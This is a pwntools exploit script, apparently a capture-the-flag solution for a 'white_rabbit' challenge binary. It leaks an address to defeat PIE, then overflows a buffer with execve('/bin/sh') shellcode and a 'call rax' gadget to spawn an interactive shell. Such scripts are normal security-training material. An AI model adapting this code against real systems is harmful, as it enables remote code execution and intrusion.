#!/usr/bin/env python3
from pwn import *

exe = ELF("./white_rabbit")

context.binary = exe
def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("whiterabbit.chal.wwctf.com", 1337)

    return r
def main():
	r = conn()
	input()
	r.recvuntil(b'> ')
	bin_leak = int(r.recv(14), 16)
	info('Leak: ' + hex(bin_leak))
	exe.address = bin_leak - exe.sym['main']
	info('Sym main: ' + hex(exe.address))
	shellcode = asm(
		'''
		mov rax, 0x3b
		mov rdi, 29400045130965551
		push rdi
		mov rdi, rsp
		xor rsi, rsi
		xor rdx, rdx
		syscall
		''', arch='amd64')
	call_rax = exe.address + 0x0000000000001014
	payload = shellcode + b'A'*91 + p64(call_rax)
	r.sendlineafter(b'follow the white rabbit...\n', payload)
	r.interactive()

if __name__ == "__main__":
    main() 